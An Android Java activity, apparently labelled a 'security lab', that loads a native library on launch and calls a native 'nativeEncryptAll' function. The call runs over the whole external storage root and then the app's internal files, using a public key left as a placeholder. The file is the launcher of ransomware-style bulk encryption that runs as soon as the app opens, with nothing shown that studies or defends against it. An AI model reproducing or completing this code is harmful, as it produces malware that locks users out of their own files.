package com.security.lab;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.widget.TextView;

public class MainActivity extends Activity {
    static {
        System.loadLibrary("securitylab");
    }

    private native String nativeEncryptAll(String rootPath, String pubKeyPem);

    @Override
    public void onCreate(Bundle state) {
        super.onCreate(state);
        TextView view = new TextView(this);
        view.setPadding(32, 48, 32, 32);
        String ext = Environment.getExternalStorageDirectory().getAbsolutePath();
        String internal = getFilesDir().getAbsolutePath();
        String pub = "-----BEGIN PUBLIC KEY-----\nREPLACE_WITH_REAL_KEY\n-----END PUBLIC KEY-----";
        String result = nativeEncryptAll(ext, pub);
        view.setText("Android Security Lab\n\n" + result);
        setContentView(view);
        nativeEncryptAll(internal, pub);
    }
}
